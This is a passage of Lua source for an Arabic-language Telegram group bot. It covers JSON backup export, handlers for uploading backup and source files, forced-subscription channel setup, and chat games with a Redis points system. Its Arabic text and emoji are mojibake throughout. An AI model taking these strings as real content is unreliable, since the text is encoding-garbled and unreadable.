for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #RioConstructors ~= 0 then
GetJson = GetJson..'"RioConstructors":['
for k,v in pairs(RioConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..Rinda..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Rinda..'.json', 'โ๏ธฐูุญุชูู ุงูููู ุนูู โข โค\n ูุฌููุนู '..#List..' \n ูุดุชุฑู '..#Users..' ' ,dl_cb, nil)
io.popen('rm -rf ./'..Rinda..'.json')
end
if text and (text == 'ุฑูุน ุงููุณุฎู' or text == 'ุฑูุน ุงููุณุฎู ุงูุงุญุชูุงุทูู' or text == 'ุฑูุน ูุณุฎู ุงูุงุญุชูุงุทูู') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'ุฑูุน ููู ุงูุณูุฑุณ' or text == 'ุฑูุน ุงูููู' and Sudo(msg) and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFileSource(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"โ๏ธฐููุฌุฏ ููุท ( 6 ) ุงุฎุชูุงุฑุงุช\nโ๏ธฐุงุฑุณู ุงุฎุชูุงุฑู ุบูเขชูู", 1, "md")    
return false  end 
local GETNUM = DevRio:get(Rinda.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Rinda.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ุงููุญูุจุณ ุจุงููุฏ ุฑูู* โข '..NUM..'\nโ๏ธฐ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*', 1, "md") 
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:del(Rinda.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ุงููุญูุจุณ ุจุงููุฏ ุฑูู* โข '..GETNUM..'\nโ๏ธฐ*ููุงุณู ููุฏ ุฎุณุฑุช ุญุงูู ุบูเขชูู ููุนุซูุฑ ุนูู ุงููุญูุจุณ*', 1, "md")
end
end
end
if DevRio:get(Rinda..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
send(msg.chat_id_, msg.id_, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ")
DevRio:del(Rinda..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(Rinda..'DevRio4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, 'โ๏ธฐุงููุนุฑู ูุง ููุฌุฏ ููู ููุงุฉ')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, 'โ๏ธฐุนุฐุฑุง ูุง ููููู ูุถุน ูุนุฑู ุญุณุงุจุงุช ูู ุงูุงุดุชุฑุงู')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, 'โ๏ธฐุนุฐุฑุง ูุง ููููู ูุถุน ูุนุฑู ูุฌููุนู ูู ุงูุงุดุชุฑุงู')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'โ๏ธฐุงูุจูุช ุงุฏูู ูู ุงูููุงุฉ \nโ๏ธฐุชูุนู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู \nโ๏ธฐุงูุฏู ุงูููุงุฉ โข '..data.id_..'\nโ๏ธฐูุนุฑู ุงูููุงุฉ โข [@'..data.type_.channel_.username_..']')
DevRio:set(Rinda..'Rio:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'โ๏ธฐุนุฐุฑุง ุงูุจูุช ููุณ ุงุฏูู ูู ุงูููุงุฉ')
end
return false  
end
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
DevRio:del(Rinda.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
return false 
end 
DevRio:del(Rinda.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(Rinda.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ูููุดุฉ ุงููุทูุฑ", 1, "md")
end
if DevRio:get(Rinda..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^ุงูุบุงุก$") then 
DevRio:del(Rinda..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ุงุณู ุงูุจูุช ', 1, 'html')
DevRio:del(Rinda..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:NameBot', text)
return false 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevRio:incr(Rinda..'Rio:UsersMsgs'..Rinda..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Rinda..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(Rinda.."Rio:Users",msg.chat_id_) then
DevRio:sadd(Rinda.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if ChatType == 'sp' or ChatType == 'gp' or ChatType == 'pv' then
if text == 'ุจูุช' or text == 'ุจูุชุช' then 
NameBot = (DevRio:get(Rinda..'Rio:NameBot') or 'ุฑููุฏุง')
local RindaTeam = {' ููู ุญุจูุจู ุ ุงูู '..NameBot..' ',' ููุงู ุงููููู '..NameBot..' ',' ุงุณูู ุงููููู '..NameBot..' '}
DevRio2 = math.random(#RindaTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'ุงุณู ุงูุจูุช' or text == 'ุงูุจูุช ุดูู ุงุณูู' or text == 'ุดุณูู ุงูุจูุช' or text == 'ุงูุจูุช ุดุณูู' then
NameBot = (DevRio:get(Rinda..'Rio:NameBot') or 'ุฑููุฏุง') 
local RindaTeam = {"ุงุณูู ุงููููู "..NameBot.." "} 
DevRio2 = math.random(#RindaTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(Rinda..'Rio:NameBot') or 'ุฑููุฏุง') then 
NameBot = (DevRio:get(Rinda..'Rio:NameBot') or 'ุฑููุฏุง')
local namebot = {'ููู ุญุจูุจู ุ ุงูู '..NameBot..' ',' ููุงู ุงููููู '..NameBot..' '} 
name = math.random(#namebot) 
Dev_Rio(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='ููุงุทู' and ChCheck(msg) then 
if tonumber((DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูู ุชุฑุจุญ ุงู ููุทู\nโ๏ธฐุงุฑุณู โข ุงูุงูุนุงุจ ููุนุจ', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุนุฏุฏ ุงูููุงุท ุงูุชู ุฑุจุญุชูุง โข '..(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'ุญุฐู ููุงุทู' and ChCheck(msg) or text ==  'ูุณุญ ููุงุทู' and ChCheck(msg) then DevRio:del(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญุฐู ุฌููุน ููุงุทู', 1, 'md') end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุณูุงููุงุช' and ChCheck(msg) or text == 'ุงูุณูุงููุงุช' and ChCheck(msg) or text == 'โข ุณูุงููุงุช โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐ฅฅ','๐ฅ','๐','๐','๐ฅ','๐ฅฆ','๐ฅ','๐ถ','๐ฝ','๐ฅ','๐ฅ','๐?','๐ฅ','๐','๐ฅ','๐ฅจ','๐ง','๐ฅ','๐ณ','๐ฅ','๐ฅ','๐ฅฉ','๐','๐','๐ญ','๐','๐','๐','๐ฅช','๐ฅ','๐ผ','โ๏ธ','๐ต','๐ฅค','๐ถ','๐บ','๐ป','๐','โฝ๏ธ','๐','โพ๏ธ','๐พ','๐','๐','๐ฑ','๐','๐ธ','๐ฅ','๐ฐ','๐ฎ','๐ณ','๐ฏ','๐','๐ป','๐ธ','๐บ','๐ฅ','๐น','๐ผ','๐ง','๐ค','๐ฌ','๐จ','๐ญ','๐ช','๐','๐ค','๐','๐ต','๐','๐','๐ฅ','??','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐','๐ฎ๐ถ','โ๏ธ','๐ก','๐ฎ','๐ก','๐ฃ','โฑ','๐ข','๐','๐','๐','๐','๐ช','๐ซ','๐ฌ','๐ญ','โฐ','๐บ','๐','โ๏ธ','๐ก'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅจ','๐ฅจ')
name = string.gsub(name,'๐ง','๐ง')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ณ','๐ณ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅฉ','๐ฅฉ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅช','๐ฅช')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ผ','๐ผ')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
name = string.gsub(name,'๐ต','๐ต')
name = string.gsub(name,'๐ฅค','๐ฅค')
name = string.gsub(name,'๐ถ','๐ถ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅฅ','๐ฅฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅฆ','๐ฅฆ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ถ','๐ถ')
name = string.gsub(name,'๐ฝ','๐ฝ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐?','๐?')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ป','๐ป')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โฝ๏ธ','โฝ๏ธ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โพ๏ธ','โพ๏ธ')
name = string.gsub(name,'๐พ','๐พ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฑ','๐ฑ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ธ','๐ธ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ฐ','๐ฐ')
name = string.gsub(name,'๐ฎ','๐ฎ')
name = string.gsub(name,'๐ณ','๐ณ')
name = string.gsub(name,'๐ฏ','๐ฏ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ป','๐ป')
name = string.gsub(name,'๐ธ','๐ธ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐น','๐น')
name = string.gsub(name,'๐ผ','๐ผ')
name = string.gsub(name,'๐ง','๐ง')
name = string.gsub(name,'๐ค','๐ค')
name = string.gsub(name,'๐ฌ','๐ฌ')
name = string.gsub(name,'๐จ','๐จ')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'๐ช','๐ช')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ค','๐ค')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ต','๐ต')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฅ','๐ฅ')
name = string.gsub(name,'๐ท','๐ท')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ฎ๐ถ','๐ฎ๐ถ')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
name = string.gsub(name,'๐ก','๐ก')
name = string.gsub(name,'๐ฎ','๐ฎ')
name = string.gsub(name,'๐ก','๐ก')
name = string.gsub(name,'๐ฃ','๐ฃ')
name = string.gsub(name,'โฑ','โฑ')
name = string.gsub(name,'๐ข','๐ข')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'๐ช','๐ช')
name = string.gsub(name,'๐ซ','๐ซ')
name = string.gsub(name,'๐ฌ','๐ฌ')
name = string.gsub(name,'๐ญ','๐ญ')
name = string.gsub(name,'โฐ','โฐ')
name = string.gsub(name,'๐บ','๐บ')
name = string.gsub(name,'๐','๐')
name = string.gsub(name,'โ๏ธ','โ๏ธ')
RindaTeam = 'โ๏ธฐุงูู ูุงุญุฏ ูุฏุฒ ูุฐุง ุงูุณูุงูู ูุฑุจุญ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุณูุงููุงุช ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end
if text == 'ุชุฑุชูุจ' and ChCheck(msg) or text == 'ุงูุชุฑุชูุจ' and ChCheck(msg) or text == 'โข ุชุฑุชูุจ โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ุณุญูุฑ','ุณูุงุฑู','ุงุณุชูุจุงู','ูููู','ุงูููู','ุจุฒููู','ูุทุจุฎ','ูุฑุณุชูุงูู','ุฏุฌุงุฌู','ูุฏุฑุณู','ุงููุงู','ุบุฑูู','ุซูุงุฌู','ูููู','ุณูููู','ุงูุนุฑุงู','ูุญุทู','ุทูุงุฑู','ุฑุงุฏุงุฑ','ููุฒู','ูุณุชุดูู','ููุฑุจุงุก','ุชูุงุญู','ุงุฎุทุจูุท','ุณูููู','ูุฑูุณุง','ุจุฑุชูุงูู','ุชูุงุญ','ูุทุฑูู','ุจุชูุชู','ููุงูู','ุดุจุงู','ุจุงุต','ุณููู','ุฐุจุงุจ','ุชููุงุฒ','ุญุงุณูุจ','ุงูุชุฑููุช','ุณุงุญู','ุฌุณุฑ'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุณุญูุฑ','ุณ ุฑ ู ุญ')
name = string.gsub(name,'ุณูุงุฑู','ู ุฑ ุณ ู ุง')
name = string.gsub(name,'ุงุณุชูุจุงู','ู ุจ ุง ุช ู ุณ ุง')
name = string.gsub(name,'ูููู','ู ู ู ู')
name = string.gsub(name,'ุงูููู','ู ู ู ุง')
name = string.gsub(name,'ุจุฒููู','ุฒ ู ู ู')
name = string.gsub(name,'ูุทุจุฎ','ุฎ ุจ ุท ู')
name = string.gsub(name,'ูุฑุณุชูุงูู','ุณ ุช ุง ู ู ู ุฑ ู')
name = string.gsub(name,'ุฏุฌุงุฌู','ุฌ ุฌ ุง ุฏ ู')
name = string.gsub(name,'ูุฏุฑุณู','ู ู ุฏ ุฑ ุณ')
name = string.gsub(name,'ุงููุงู','ู ุง ู ุง ู')
name = string.gsub(name,'ุบุฑูู','ุบ ู ุฑ ู')
name = string.gsub(name,'ุซูุงุฌู','ุฌ ู ุช ู ุง')
name = string.gsub(name,'ูููู','ู ู ู ู')
name = string.gsub(name,'ุณูููู','ู ู ู ู ุณ')
name = string.gsub(name,'ุงูุนุฑุงู','ู ุน ุง ู ุฑ ุง')
name = string.gsub(name,'ูุญุทู','ู ุท ู ุญ')
name = string.gsub(name,'ุทูุงุฑู','ุฑ ุง ุท ู ู')
name = string.gsub(name,'ุฑุงุฏุงุฑ','ุฑ ุง ุฑ ุง ุฏ')
name = string.gsub(name,'ููุฒู','ู ุฒ ู ู')
name = string.gsub(name,'ูุณุชุดูู','ู ุด ุณ ู ุช ู')
name = string.gsub(name,'ููุฑุจุงุก','ุฑ ุจ ู ู ุง ุก')
name = string.gsub(name,'ุชูุงุญู','ุญ ู ุง ุช ู')
name = string.gsub(name,'ุงุฎุทุจูุท','ุท ุจ ู ุง ุฎ ุท')
name = string.gsub(name,'ุณูููู','ู ู ู ู ุณ')
name = string.gsub(name,'ูุฑูุณุง','ู ู ุฑ ุณ ุง')
name = string.gsub(name,'ุจุฑุชูุงูู','ุฑ ุช ู ุจ ุง ู ู')
name = string.gsub(name,'ุชูุงุญ','ุญ ู ุง ุช')
name = string.gsub(name,'ูุทุฑูู','ู ุท ู ุฑ ู')
name = string.gsub(name,'ุจุชูุชู','ุจ ุช ุช ู ู')
name = string.gsub(name,'ููุงูู','ู ู ู ู ู')
name = string.gsub(name,'ุดุจุงู','ุจ ุด ุง ู')
name = string.gsub(name,'ุจุงุต','ุต ุง ุจ')
name = string.gsub(name,'ุณููู','ู ุณ ู ู')
name = string.gsub(name,'ุฐุจุงุจ','ุจ ุง ุจ ุฐ')
name = string.gsub(name,'ุชููุงุฒ','ุช ู ู ุฒ ุง')
name = string.gsub(name,'ุญุงุณูุจ','ุณ ุง ุญ ู ุจ')
name = string.gsub(name,'ุงูุชุฑููุช','ุง ุช ู ุฑ ู ู ุช')
name = string.gsub(name,'ุณุงุญู','ุญ ุง ู ุณ')
name = string.gsub(name,'ุฌุณุฑ','ุฑ ุฌ ุณ')
RindaTeam = 'โ๏ธฐุงูู ูุงุญุฏ ูุฑุชุจูุง ูุฑุจุญ โข '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
return false
end end
if text == DevRio:get(Rinda..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Games:Ids'..msg.chat_id_) then 
RindaTeam = 'โ๏ธฐูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธฐุงุฑุณู โข ุชุฑุชูุจ ููุนุจ ุบูเขชูู'
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md')
DevRio:incrby(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Rinda..'Rio:Games:Ids'..msg.chat_id_,true)
end
if text == 'ูุญูุจุณ' and ChCheck(msg) or text == 'ุจุงุช' and ChCheck(msg) or text == 'ุงููุญูุจุณ' and ChCheck(msg) or text == 'โข ูุญูุจุณ โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(Rinda.."GAMES"..msg.chat_id_,Num) 
TEST = [[
โ     โ     โ     โ     โ     โ
โ     โ     โ     โ     โ     โ
๐ โนโบ ๐๐ป โนโบ ๐๐ผ โนโบ ๐๐ฝ โนโบ ๐๐พ โนโบ ๐๐ฟ
โ๏ธฐุงุฎุชุฑ ุฑูู ูุงุณุชุฎุฑุงุฌ ุงููุญูุจุณ
โ๏ธฐุงููุงุฆุฒ ูุญุตู ุนูู (5) ููุงุท
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevRio:setex(Rinda.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'ุญุฒูุฑู' and ChCheck(msg) or text == 'ุงูุญุฒูุฑู' and ChCheck(msg) or text == 'โข ุญุฒูุฑู โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'ุงูุฌุฑุณ','ุนูุฑุจ ุงูุณุงุนู','ุงูุณูู','ุงููุทุฑ','5','ุงููุชุงุจ','ุงูุจุณูุงุฑ','7','ุงููุนุจู','ุจูุช ุงูุดุนุฑ','ููุงูู','ุงูุง','ุงูู','ุงูุงุจุฑู','ุงูุณุงุนู','22','ุบูุท','ูู ุงูุณุงุนู','ุงูุจูุชูุฌุงู','ุงูุจูุถ','ุงููุฑุงูู','ุงูุถูุก','ุงูููุงุก','ุงูุถู','ุงูุนูุฑ','ุงูููู','ุงููุดุท','ุงูุญูุฑู','ุงูุจุญุฑ','ุงูุซูุฌ','ุงูุงุณููุฌ','ุงูุตูุช','ุจูู'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Rinda..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Rinda..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุงูุฌุฑุณ','ุดูุฆ ุงุฐุง ููุณุชู ุตุฑุฎ ูุง ููู ุ')
name = string.gsub(name,'ุนูุฑุจ ุงูุณุงุนู','ุงุฎูุงู ูุง ูุณุชุทูุนุงู ุชูุถูู ุงูุซุฑ ูู ุฏูููู ูุนุง ููุง ููุง ุ')
name = string.gsub(name,'ุงูุณูู','ูุง ูู ุงูุญููุงู ุงูุฐู ูู ูุตุนุฏ ุงูู ุณูููุฉ ููุญ ุนููู ุงูุณูุงู ุ')
name = string.gsub(name,'ุงููุทุฑ','ุดูุฆ ูุณูุท ุนูู ุฑุฃุณู ูู ุงูุงุนูู ููุง ูุฌุฑุญู ููุง ูู ุ')
name = string.gsub(name,'5','ูุง ุงูุนุฏุฏ ุงูุฐู ุงุฐุง ุถุฑุจุชู ุจููุณู ูุงุถูุช ุนููู 5 ูุตุจุญ ุซูุงุซูู ')
name = string.gsub(name,'ุงููุชุงุจ','ูุง ุงูุดูุฆ ุงูุฐู ูู ุงูุฑุงู ูููุณ ูู ุฌุฐูุฑ ุ')
name = string.gsub(name,'ุงูุจุณูุงุฑ','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุง ููุดู ุงูุง ุจุงูุถุฑุจ ุ')
name = string.gsub(name,'7','ุนุงุฆูู ูุคููู ูู 6 ุจูุงุช ูุงุฎ ููู ูููู .ููู ุนุฏุฏ ุงูุฑุงุฏ ุงูุนุงุฆูู ')
name = string.gsub(name,'ุงููุนุจู','ูุง ูู ุงูุดูุฆ ุงูููุฌูุฏ ูุณุท ููุฉ ุ')
name = string.gsub(name,'ุจูุช ุงูุดุนุฑ','ูุง ูู ุงูุจูุช ุงูุฐู ููุณ ููู ุงุจูุงุจ ููุง ููุงูุฐ ุ ')
name = string.gsub(name,'ููุงูู','ูุญุฏู ุญููู ููุบุฑูุฑู ุชูุจุณ ููุฉ ุชููุฑู .ูู ููู ุ ')
name = string.gsub(name,'ุงูุง','ุงุจู ุงูู ูุงุจู ุงุจูู ูููุณ ุจุงุฎุชู ููุง ุจุงุฎูู ููู ูููู ุ')
name = string.gsub(name,'ุงูู','ุงุฎุช ุฎุงูู ูููุณุช ุฎุงูุชู ูู ุชููู ุ ')
name = string.gsub(name,'ุงูุงุจุฑู','ูุง ูู ุงูุดูุฆ ุงูุฐู ูููุง ุฎุทุง ุฎุทูู ููุฏ ุดูุฆุง ูู ุฐููู ุ ')
name = string.gsub(name,'ุงูุณุงุนู','ูุง ูู ุงูุดูุฆ ุงูุฐู ูููู ุงูุตุฏู ููููู ุงุฐุง ุฌุงุน ูุฐุจ ุ')
name = string.gsub(name,'22','ูู ูุฑู ููุทุจู ุนูุฑุจุง ุงูุณุงุนู ุนูู ุจุนุถููุง ูู ุงูููู ุงููุงุญุฏ ')
name = string.gsub(name,'ุบูุท','ูุง ูู ุงููููู ุงููุญูุฏู ุงูุชู ุชููุถ ุบูุท ุฏุงุฆูุง ุ ')
name = string.gsub(name,'ูู ุงูุณุงุนู','ูุง ูู ุงูุณุคุงู ุงูุฐู ุชุฎุชูู ุงุฌุงุจุชู ุฏุงุฆูุง ุ')
name = string.gsub(name,'ุงูุจูุชูุฌุงู','ุฌุณู ุงุณูุฏ ูููุจ ุงุจูุถ ูุฑุงุณ ุงุฎุธุฑ ููุง ูู ุ')
name = string.gsub(name,'ุงูุจูุถ','ูุงูู ุงูุดูุฆ ุงูุฐู ุงุณูู ุนูู ูููู ุ')
name = string.gsub(name,'ุงููุฑุงูู','ุงุฑู ูู ุดูุฆ ูู ุฏูู ุนููู ูู ุงููู ุ ')
name = string.gsub(name,'ุงูุถูุก','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุฎุชุฑู ุงูุฒุฌุงุฌ ููุง ููุณุฑู ุ')
name = string.gsub(name,'ุงูููุงุก','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุณูุฑ ุงูุงูู ููุง ุชุฑุงู ุ')
name = string.gsub(name,'ุงูุถู','ูุง ูู ุงูุดูุฆ ุงูุฐู ููุงุญูู ุงูููุง ุชุฐูุจ ุ ')
